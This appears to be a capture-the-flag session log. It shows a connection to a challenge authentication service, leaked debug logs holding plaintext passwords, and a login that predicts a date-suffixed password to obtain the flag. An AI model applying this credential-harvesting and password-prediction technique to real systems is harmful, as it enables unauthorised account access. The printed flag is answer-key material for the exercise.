```bash
zenniskayy@ZennisKayy:~/CTF$ nc challs.watctf.org 8000
Daily Bugle Authentication System
============================================================
Commands:
  logs
  login <username> <password>
  exit
============================================================
> logs
{
  "timestamp": "2025-09-11T02:06:48.283452",
  "login_attempts": [
    {
      "timestamp": "2025-09-08T08:15:23",
      "date": "2025-09-08",
      "user": "admin",
      "password": "admin123",
      "type": "login_attempt",
      "status": "failed",
      "reason": "invalid_credentials"
    },
    {
      "timestamp": "2025-09-09T09:22:45",
      "date": "2025-09-09",
      "user": "test1",
      "password": "securepass2024_2025-09-09",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    },
    {
      "timestamp": "2025-09-08T10:33:12",
      "date": "2025-09-08",
      "user": "guest",
      "password": "guest",
      "type": "login_attempt",
      "status": "failed",
      "reason": "account_locked"
    },
    {
      "timestamp": "2025-09-06T11:44:56",
      "date": "2025-09-06",
      "user": "test2",
      "password": "mypassword456_2025-09-06",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    },
    {
      "timestamp": "2025-09-05T12:55:33",
      "date": "2025-09-05",
      "user": "service",
      "password": "wrongpass",
      "type": "login_attempt",
      "status": "failed",
      "reason": "invalid_credentials"
    },
    {
      "timestamp": "2025-09-08T13:16:07",
      "date": "2025-09-08",
      "user": "test3",
      "password": "hunter2021_2025-09-08",
      "type": "login_attempt",
      "status": "success",
      "reason": "valid_credentials"
    }
  ],
  "recent_logins": [],
  "message": "System logs - FOR DEBUGGING ONLY"
}
> login admin admin123_2025-09-11
{
  "Status": "400",
  "Message": "User 'admin' is not registered."
}
> login test1 securepass2024_2025-09-11
{
  "Status": "200",
  "Message": "Replay attack successful",
  "flag": "watctf{web_slinger_replay_2025}"
}
>
```

>Flag: `watctf{web_slinger_replay_2025}`